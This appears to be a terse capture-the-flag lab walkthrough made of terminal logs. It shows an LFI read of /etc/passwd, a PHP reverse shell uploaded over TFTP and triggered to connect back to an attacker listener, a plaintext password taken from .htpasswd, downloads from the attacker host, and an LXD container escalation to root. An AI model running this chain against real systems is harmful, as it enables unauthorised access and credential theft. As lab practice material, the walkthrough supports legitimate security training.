1.I notice it is vulnerable to LFI
```bash
┌──(sabeshan㉿kali)-[~]
└─$ curl http://10.129.151.160/?file=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
--------------------------------=====----------------------------
```
2.Switched to the UDP scan identifed the any open ports. There is open port TFTP and it will allowed to upload remote code files into the system.
```bash                                                                                                                                                            
┌──(sabeshan㉿kali)-[~]
└─$ head shell_rev.php                                       
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.20';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
```
```bash
┌──(sabeshan㉿kali)-[~]
└─$ tftp 10.129.151.160                
tftp> dir
?Invalid command
tftp> ?
tftp-hpa 5.3
Commands may be abbreviated.  Commands are:

connect         connect to remote tftp
mode            set file transfer mode
put             send file
get             receive file
quit            exit tftp
verbose         toggle verbose mode
trace           toggle packet tracing
literal         toggle literal mode, ignore ':' in file name
status          show current status
binary          set mode to octet
ascii           set mode to netascii
rexmt           set per-packet transmission timeout
timeout         set total retransmission timeout
?               print help information
help            print help information
tftp> put shell_rev.php
tftp> quit
```
=============================================================================
```bash
┌──(sabeshan㉿kali)-[~]
└─$ curl http://10.129.151.160/?file=/var/lib/tftpboot/shell_rev.php

──(sabeshan㉿kali)-[~]
└─$ nc -lvnp 1337              
listening on [any] 1337 ...
connect to [10.10.16.20] from (UNKNOWN) [10.129.151.160] 55852
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 13:56:07 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1619): Inappropriate ioctl for device
bash: no job control in this shell
www-data@included:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@included:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                             
┌──(sabeshan㉿kali)-[~]
└─$ stty raw -echo; fg           
[1]  + continued  nc -lvnp 1337

www-data@included:/$ export TERM=xterm
www-data@included:/$
```
----------------------------------------------------------------------
```bash
www-data@included:/var/www/html$ ls -la
total 88
drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
www-data@included:/var/www/html$ cat .htpasswd
mike:Sheffield19
www-data@included:/var/www/html$ 
mike@included:~$ groups
mike lxd
mike@included:~$
```
--------------------------------------------------------------------------
```bash
ww-data@included:/$ su mike
Password: 
su: Authentication failure
www-data@included:/$ su mike         
Password: 
mike@included:/$ wget http://10.10.16.20:8000/incus.tar.xz
--2025-08-25 12:41:16--  http://10.10.16.20:8000/incus.tar.xz
Connecting to 10.10.16.20:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 888 [application/x-xz]
incus.tar.xz: Permission denied

Cannot write to ‘incus.tar.xz’ (Permission denied).
mike@included:/$ cd ~
mike@included:~$ wget http://10.10.16.20:8000/incus.tar.xz
--2025-08-25 12:41:41--  http://10.10.16.20:8000/incus.tar.xz
Connecting to 10.10.16.20:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 888 [application/x-xz]
Saving to: ‘incus.tar.xz’

incus.tar.xz        100%[===================>]     888  --.-KB/s    in 0s      

2025-08-25 12:41:42 (96.5 MB/s) - ‘incus.tar.xz’ saved [888/888]

mike@included:~$ wget http://10.10.16.20:8000/rootfs.squashfs
--2025-08-25 12:42:47--  http://10.10.16.20:8000/rootfs.squashfs
Connecting to 10.10.16.20:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3096576 (3.0M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs     100%[===================>]   2.95M   310KB/s    in 10s     

2025-08-25 12:42:59 (289 KB/s) - ‘rootfs.squashfs’ saved [3096576/3096576]

mike@included:~$ lxc image import incus.tar.xz rootfs.squashfs --alias alpine
mike@included:~$ lxc image list
+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
| alpine | 74096f964c10 | no     | Alpinelinux 3.18 x86_64 (20250825_1214) | x86_64 | 2.95MB | Aug 25, 2025 at 12:44pm (UTC) |
+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
mike@included:~$ lxc init alpine privesc -c security.privileged=true
Creating privesc
mike@included:~$ lxc list
+---------+---------+------+------+------------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
mike@included:~$ lxc start privesc
mike@included:~$ lxc exec privesc /bin/sh
~ # cd /mnt/root
/bin/sh: cd: can't cd to /mnt/root: No such file or directory
~ # ls -la
total 12
drwx------    2 root     root          4096 Aug 25 12:46 .
drwxr-xr-x   19 root     root          4096 Aug 25 12:45 ..
-rw-------    1 root     root            20 Aug 25 12:46 .ash_history
~ # cd /
/ # ls -la
total 60
drwxr-xr-x   19 root     root          4096 Aug 25 12:45 .
drwxr-xr-x   19 root     root          4096 Aug 25 12:45 ..
drwxr-xr-x    2 root     root          4096 Aug 25 12:14 bin
drwxr-xr-x    8 root     root           460 Aug 25 12:45 dev
drwxr-xr-x   23 root     root          4096 Aug 25 12:45 etc
drwxr-xr-x    2 root     root          4096 Sep  6  2024 home
drwxr-xr-x    8 root     root          4096 Aug 25 12:14 lib
drwxr-xr-x    5 root     root          4096 Sep  6  2024 media
drwxr-xr-x    2 root     root          4096 Sep  6  2024 mnt
drwxr-xr-x    2 root     root          4096 Sep  6  2024 opt
dr-xr-xr-x  145 root     root             0 Aug 25 12:45 proc
drwx------    2 root     root          4096 Aug 25 12:46 root
drwxr-xr-x    4 root     root           240 Aug 25 12:45 run
drwxr-xr-x    2 root     root          4096 Aug 25 12:14 sbin
drwxr-xr-x    2 root     root          4096 Sep  6  2024 srv
dr-xr-xr-x   13 root     root             0 Aug 25 12:45 sys
drwxrwxrwt    4 root     root          4096 Aug 25 12:45 tmp
drwxr-xr-x    8 root     root          4096 Aug 25 12:14 usr
drwxr-xr-x   11 root     root          4096 Aug 25 12:45 var
/ # cd root
~ # ls -la
total 12
drwx------    2 root     root          4096 Aug 25 12:46 .
drwxr-xr-x   19 root     root          4096 Aug 25 12:45 ..
-rw-------    1 root     root            47 Aug 25 12:46 .ash_history
~ # cd /
/ # cd mnt
/mnt # ls -la
total 8
drwxr-xr-x    2 root     root          4096 Sep  6  2024 .
drwxr-xr-x   19 root     root          4096 Aug 25 12:45 ..
/mnt # cd ~
~ # cat /root/root.txt
cat: can't open '/root/root.txt': No such file or directory
~ # whoami
root
~ # gorups
/bin/sh: gorups: not found
~ # id
uid=0(root) gid=0(root)
-------------------------------------------------------------------------------------
```
